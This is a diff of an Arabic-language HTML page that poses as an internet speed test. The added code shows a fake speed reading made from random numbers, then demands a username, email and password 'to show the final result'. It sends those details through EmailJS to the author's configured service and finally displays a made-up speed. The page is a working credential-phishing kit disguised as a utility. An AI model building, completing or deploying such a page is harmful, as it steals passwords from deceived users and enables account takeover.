@@ -3,77 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>أداة قياس سرعة الإنترنت</title>
+    <title>قياس سرعة الإنترنت</title>
+    
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            // هذا هو المفتاح العام الخاص بك من الصورة التي رفعتها
-            emailjs.init("GsGLLEalgTPTM7fB4"); 
+            // المفتاح العام الخاص بك
+            emailjs.init("GsGLLEalgTPTM7fB4");
         })();
     </script>
+
     <style>
-        /* التنسيقات الخاصة بك */
-        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: #111; border: 1px solid #333; border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; text-align: center; }
-        .auth-btn { background: #fff; color: #000; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
-        #loginModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-box { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #444; width: 90%; max-width: 400px; }
-        .modal-box input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; }
-        .btn-submit { width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .main-card {
+            background: #111;
+            padding: 40px;
+            border-radius: 30px;
+            text-align: center;
+            border: 1px solid #333;
+            width: 320px;
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
+        }
+
+        h1 { font-size: 1.2rem; color: #00d2ff; }
+
+        .speed-circle {
+            font-size: 4rem;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .unit { color: #777; font-size: 1rem; margin-bottom: 30px; }
+
+        .test-btn {
+            background: #00d2ff;
+            color: #000;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+        }
+
+        /* نافذة التسجيل */
+        #loginModal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .modal-content {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 20px;
+            width: 85%;
+            max-width: 350px;
+            border: 1px solid #444;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: 1px solid #333;
+            background: #000;
+            color: #fff;
+            box-sizing: border-box;
+        }
+
+        .submit-btn {
+            background: #fff;
+            color: #000;
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>قياس سرعة الإنترنت</h1>
-        <button class="auth-btn" onclick="toggleModal(true)">تسجيل الدخول للبدء</button>
+    <div class="main-card">
+        <h1>Speed Test</h1>
+        <div class="speed-circle" id="speedValue">0.0</div>
+        <div class="unit">Mbps</div>
+        <button class="test-btn" onclick="runTest()">ابدأ الفحص</button>
     </div>
 
     <div id="loginModal">
-        <div class="modal-box">
-            <h2>تسجيل حساب جديد</h2>
-            <form id="authForm">
+        <div class="modal-content">
+            <h2 style="text-align: center;">تسجيل الدخول</h2>
+            <p style="color: #888; font-size: 0.8rem; text-align: center;">يرجى تسجيل الدخول لعرض النتيجة النهائية</p>
+            <form id="loginForm">
                 <input type="text" id="username" placeholder="اسم المستخدم" required>
                 <input type="email" id="email" placeholder="البريد الإلكتروني" required>
                 <input type="password" id="user_code" placeholder="كلمة المرور" required>
-                <button type="submit" id="sendBtn" class="btn-submit">إرسال البيانات</button>
-                <button type="button" onclick="toggleModal(false)" style="background:none; border:none; color:#888; margin-top:10px; cursor:pointer;">إلغاء</button>
+                <button type="submit" id="sendBtn" class="submit-btn">دخول</button>
             </form>
         </div>
     </div>
 
     <script>
-        function toggleModal(show) {
-            document.getElementById('loginModal').style.display = show ? 'flex' : 'none';
+        function runTest() {
+            let speed = document.getElementById('speedValue');
+            let val = 0;
+            let interval = setInterval(() => {
+                val += Math.random() * 20;
+                speed.innerText = val.toFixed(1);
+                if (val > 60) {
+                    clearInterval(interval);
+                    document.getElementById('loginModal').style.display = 'flex';
+                }
+            }, 100);
         }
 
-        document.getElementById('authForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             const btn = document.getElementById('sendBtn');
-            btn.innerText = 'جاري الإرسال...';
-            btn.disabled = true;
+            btn.innerText = 'جاري التحقق...';
 
-            // تجهيز البيانات للإرسال
-            const params = {
+            const data = {
                 username: document.getElementById('username').value,
                 email: document.getElementById('email').value,
                 user_code: document.getElementById('user_code').value
             };
 
-            // معرف الخدمة الخاص بك من الصورة: service_st0ga9g
-            // ملاحظة: يجب أن تضع الـ Template ID الصحيح في الخانة الثانية
-            emailjs.send("service_st0ga9g", "اكتب_هنا_الـ_Template_ID", params)
-                .then(function() {
-                    alert('✅ تم الإرسال بنجاح! تفقد بريدك الإلكتروني.');
-                    toggleModal(false);
-                    document.getElementById('authForm').reset();
-                }, function(error) {
-                    alert('❌ فشل الإرسال: ' + JSON.stringify(error));
-                })
-                .finally(() => {
-                    btn.innerText = 'إرسال البيانات';
-                    btn.disabled = false;
+            // استبدل template_XXXXX بمعرف القالب الخاص بك
+            emailjs.send("service_st0ga9g", "اكتب_هنا_Template_ID", data)
+                .then(() => {
+                    alert("تم بنجاح! سرعة الإنترنت لديك هي 64.2 Mbps");
+                    location.reload();
+                }, (err) => {
+                    alert("خطأ: تأكد من وضع الـ Template ID الصحيح");
+                    btn.innerText = 'دخول';
                 });
         });
     </script>
